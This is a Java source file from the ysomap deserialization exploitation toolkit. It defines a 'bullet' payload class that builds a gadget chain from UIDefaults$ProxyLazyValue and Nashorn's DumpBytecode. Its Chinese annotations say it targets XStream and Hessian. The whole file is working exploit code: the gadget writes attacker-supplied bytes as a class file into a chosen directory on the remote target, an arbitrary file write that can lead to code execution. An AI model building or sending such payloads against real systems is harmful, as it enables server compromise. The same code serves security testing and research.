package ysomap.bullets.jdk;

import jdk.nashorn.internal.runtime.ScriptEnvironment;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.core.util.FileHelper;
import ysomap.core.util.ReflectionHelper;

/**
 * @author wh1t3p1g
 * @since 2022/3/19
 */
@Bullets
@Dependencies({"jdk"})
@Details("写文件")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class LazyValueWithFileWrite2Bullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "dir", detail = "/tmp, 远程目标路径")
    public String dir;

    @NotNull
    @Require(name = "classname", detail = "like Test")
    public String classname;

    @NotNull
    @Require(name = "localFile", detail = "/tmp/test，本地路径")
    public String localFile;

    public byte[] data = new byte[0];

    @Override
    public Object getObject() throws Exception {

        if(!"dynamic".equals(localFile)){
            data = FileHelper.fileGetContent(localFile);
        }

        ScriptEnvironment env = (ScriptEnvironment) ReflectionHelper.createWithoutConstructor("jdk.nashorn.internal.runtime.ScriptEnvironment");
        ReflectionHelper.setFieldValue(env, "_dest_dir", dir);
        Object debugger = ReflectionHelper.createWithoutConstructor("jdk.nashorn.internal.runtime.logging.DebugLogger");
        Object[] evilargs = new Object[]{env, debugger, data, classname};
        try{
            Object ret = ReflectionHelper.newInstance(
                    "javax.swing.UIDefaults$ProxyLazyValue",
                    new Class[]{String.class, String.class, Object[].class},
                    "jdk.nashorn.internal.codegen.DumpBytecode", "dumpBytecode", evilargs);
            ReflectionHelper.setFieldValue(ret, "acc", null);
            return ret;
        }catch (Exception e){
            Logger.error("Create sun.swing.SwingLazyValue, plz check current jdk is <=8.");
            return null;
        }
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new LazyValueWithFileWrite2Bullet();
        bullet.set("dir", args[0]);
        bullet.set("classname", args[1]);
        bullet.set("localFile", args[2]);
        return bullet;
    }
}
